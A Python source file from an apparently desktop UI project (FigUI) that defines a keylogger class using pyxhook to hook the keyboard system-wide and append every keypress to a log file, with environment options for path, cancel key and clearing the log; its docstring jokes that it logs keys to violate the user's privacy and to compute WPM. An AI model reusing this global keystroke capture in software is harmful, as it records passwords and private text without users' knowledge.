import os
import pyxhook
try:
    from FigUI.assets.Linker import FigLinker
except ImportError:
    from ...assets.Linker import FigLinker
# This tells the keylogger where the log file will go.
# You can set the file path as an environment variable ('pylogger_file'),
# or use the default ~/Desktop/file.log
class FigKeyEventLogger:
    '''
    log keys to violate the users privacy. 
    Also store timestamps so WPM can be calculated later.
    '''
    def __init__(self):
        self.linker = FigLinker(__file__, "../../../assets")
        self.keylogger_path = os.environ.get(
            'FIG_KEYLOGGER_PATH',
            self.linker.asset("keyevents.log")
        )
        self.fin = open(self.keylogger_path, "a")
        # Allow setting the cancel key from environment args, Default: `
        self.cancel_key = ord(
            os.environ.get(
                'FIG_KEYLOGGER_CANCEL', '`'
            )[0]
        )
        # Allow clearing the log file on start, if pylogger_clean is defined.
        if os.environ.get('FIG_KEYLOGGER_CLEAN', None) is not None:
            try:
                os.remove(self.keylogger_path)
            except EnvironmentError:
            # File does not exist, or no permissions.
                pass
        # create a hook manager object
        self.hook = pyxhook.HookManager()
        self.hook.KeyDown = self.onKeyPress
        # set hook.
        self.hook.HookKeyboard()
        try:
            self.hook.start()
        except KeyboardInterrupt:
            exit("\x1b[31;1mexited\x1b[0m on \x1b[1mKeyboardInterrupt\x1b[0m")
        except Exception as ex:
            msg = 'Error while catching events:\n  {}'.format(ex)
            pyxhook.print_err(msg)
            # with open(self.keylogger_path, 'a') as f:
            #     f.write('\n{}'.format(msg))
    def onKeyPress(self, event):
        with open(self.keylogger_path, 'a') as f:
            f.write('{}\n'.format(event.Key))


def main():
    keyLogger = FigKeyEventLogger()

if __name__ == "__main__":
    main()